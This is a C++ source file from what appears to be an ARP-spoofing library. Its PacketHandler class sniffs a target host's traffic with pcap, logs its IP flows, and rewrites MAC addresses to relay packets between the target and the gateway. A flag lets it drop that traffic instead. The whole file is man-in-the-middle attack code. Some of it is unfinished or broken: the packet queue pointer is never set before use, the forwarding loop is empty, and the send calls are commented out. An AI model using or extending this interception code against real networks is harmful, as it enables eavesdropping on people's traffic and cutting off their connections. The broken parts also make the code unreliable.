#include "arp_spoofer_lib/headers/net_structure.h"
#include "arp_spoofer_lib/headers/PacketHandler.h"

void PacketHandler::packet_handler_f(u_char *param,
                                     const struct pcap_pkthdr *header,
                                     const u_char *pkt_data) {
    // Parse user parameters
    auto *args = (pkt_handler_args *) param;
    bool *will_drop_pkt = args->will_drop_pkt;
    bool *to_stop = args->to_stop;
    pcap_t *adapter = args->adapter;
    u_char *self_mac = args->self_mac;
    u_char *gateway_mac = args->gateway_mac;
    u_char *target_mac = args->target_mac;
    u_char *target_ip = args->target_ip;
    pkt_queue &forwarded_pkt_queue = *(args->forwarded_pkt_queue);


    // Parse packet data
    auto *eh = (ethernet_header *) pkt_data;
    auto *ih = (ip_header *) (pkt_data + sizeof(ethernet_header));

    if (*to_stop) {
        pcap_breakloop(adapter);
    }

    // If packet is sent from gateway to target
    if (equal(ih->destination_addr, ih->destination_addr + 4,
              target_ip)) {
        printf("To   Target:  %3d.%3d.%3d.%3d -> %3d.%3d.%3d.%3d | %-4d",
               EXPAND_IP(ih->source_addr),
               EXPAND_IP(target_ip),
               header->len);

        if (equal(eh->dst_mac, eh->dst_mac + 6, self_mac))
            printf(" | From Gateway\n");
        else if (equal(eh->dst_mac, eh->dst_mac + 6, target_mac))
            printf(" | Forwarding\n");
        else
            printf("\n");


        if (!(*will_drop_pkt)) {
            std::copy(self_mac, self_mac + 6, eh->src_mac);
            std::copy(target_mac, target_mac + 6, eh->dst_mac);

            _to_farward_pkt pkt;
            pkt.len = header->len;
            std::copy(pkt_data, pkt_data + header->len, pkt.packet);
            forwarded_pkt_queue.push_back(pkt);
//            if (pcap_sendpacket(adapter,
//                                (const u_char *) pkt_data,
//                                header->len
//            ) < 0) {
//                pcap_perror(adapter, "[packet_handler_f] "
//                                     "Error occurred when forwarding packet to "
//                                     "target: ");
////                *to_stop = true;
//            }
        }
    }

    // If packet is sent from target to gateway
    if (equal(ih->source_addr, ih->source_addr + 4,
              target_ip)) {
        printf("From Target:  %3d.%3d.%3d.%3d -> %3d.%3d.%3d.%3d | %-4d",
               EXPAND_IP(target_ip),
               EXPAND_IP(ih->destination_addr),
               header->len);

        if (equal(eh->dst_mac, eh->dst_mac + 6, self_mac))
            printf(" | From Target\n");
        else if (equal(eh->dst_mac, eh->dst_mac + 6, gateway_mac))
            printf(" | Forwarding\n");
        else
            printf("\n");

        if (!(*will_drop_pkt)) {
            std::copy(self_mac, self_mac + 6, eh->src_mac);
            std::copy(gateway_mac, gateway_mac + 6, eh->dst_mac);

            _to_farward_pkt pkt;
            pkt.len = header->len;
            std::copy(pkt_data, pkt_data + header->len, pkt.packet);
            forwarded_pkt_queue.push_back(pkt);

//            if (pcap_sendpacket(adapter,
//                                (const u_char *) pkt_data,
//                                header->len
//            ) < 0) {
//                pcap_perror(adapter, "[packet_handler_f] "
//                                     "Error occurred when forwarding packet to "
//                                     "gateway: ");
////                *to_stop = true;
//            }
        }
    }
}

void PacketHandler::start() {
    stop();

    pkt_handler_args args;
    args.will_drop_pkt = &m_will_drop_pkt;
    args.to_stop = &m_to_stop;
    args.adapter = m_adapter;
    args.self_mac = m_self_mac;
    args.target_mac = m_target_mac;
    args.gateway_mac = m_gateway_mac;
    args.target_ip = m_target_ip;

    auto pcap_loop_lambda_f = [this, args]() {
        pcap_loop(m_adapter, 0,
                  &PacketHandler::packet_handler_f, (u_char *) &args);
    };

    m_pcap_loop_t = thread(pcap_loop_lambda_f);
}

void PacketHandler::stop() {
    if (m_pcap_loop_t.joinable()) {
        m_to_stop = true;
        m_pcap_loop_t.join();
    }
    m_to_stop = false;
}

PacketHandler::PacketHandler(pcap_t *adapter, u_char self_mac[6],
                             u_char target_mac[6], u_char gateway_mac[6],
                             u_char target_ip[4])
        : m_adapter(adapter), m_to_stop(false),
          m_to_stop_forwarding(false), m_will_drop_pkt(false) {
    std::copy(target_ip, target_ip + 4, m_target_ip);
    std::copy(self_mac, self_mac + 6, m_self_mac);
    std::copy(gateway_mac, gateway_mac + 6, m_gateway_mac);
    std::copy(target_mac, target_mac + 6, m_target_mac);
}

void PacketHandler::set_drop_packet(bool v) {
    m_will_drop_pkt = v;
}

void PacketHandler::start_forwarding_thread() {
    auto packet_forwarding_lambda_f
            = [this](bool &to_stop_forwarding, pkt_queue &pkt_q) {
                while (!to_stop_forwarding) {
                    const _to_farward_pkt &pkt = pkt_q.front();

                }
            };

    m_pcap_forwarding_t = thread(packet_forwarding_lambda_f,
                                 std::ref(m_to_stop_forwarding),
                                 std::ref(m_forwarded_pkt_queue));
}

